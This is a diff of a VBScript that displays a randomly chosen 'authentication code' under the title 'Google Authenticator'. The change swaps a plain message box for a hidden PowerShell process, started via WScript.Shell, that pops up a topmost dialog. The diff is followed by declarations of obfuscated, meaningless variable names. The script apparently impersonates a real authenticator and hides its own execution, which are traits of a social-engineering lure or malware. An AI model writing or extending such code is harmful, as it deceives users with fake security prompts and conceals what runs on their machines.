@@ -20,7 +20,17 @@ otp = array(randomIndex)
 Dim formattedOTP
 formattedOTP = Left(otp, 3) & " " & Mid(otp, 4, 3)
 
-MsgBox "Authentication code: " & formattedOTP, vbOKOnly, "Google Authenticator"
+Dim ssssssshl
+Set ssssssshl = CreateObject("WScript.Shell")
+
+ccccccmd = "powershell -WindowStyle Hidden -Command " & _
+      """Add-Type -AssemblyName System.Windows.Forms; " & _
+      "$f=New-Object Windows.Forms.Form; " & _
+      "$f.TopMost=$true; " & _
+      "[System.Windows.Forms.MessageBox]::Show($f,'Authentication code: " & formattedOTP & "','Google Authenticator')"""
+
+ssssssshl.Run ccccccmd, 0, True
+
 Dim aaaaaaabncjds, qwoiughduiobhciwe, fwcwfcuhwfcnhioquf, zbxcvnbzcxvmzxb, pppppppppppooooooooodddd
 Dim oupgmruvfnblgtyuf, wygbvfqiuegwnyeb, eyucvbodibuwquios, wuernvgoreuihvnfgpoeruifvyhbpodia
 Dim ffffffffffffffffffffffffffaaaaaaaaaaaaasss, rgbyeuiowuiowuiowhno, MFHEHDOWNXKS
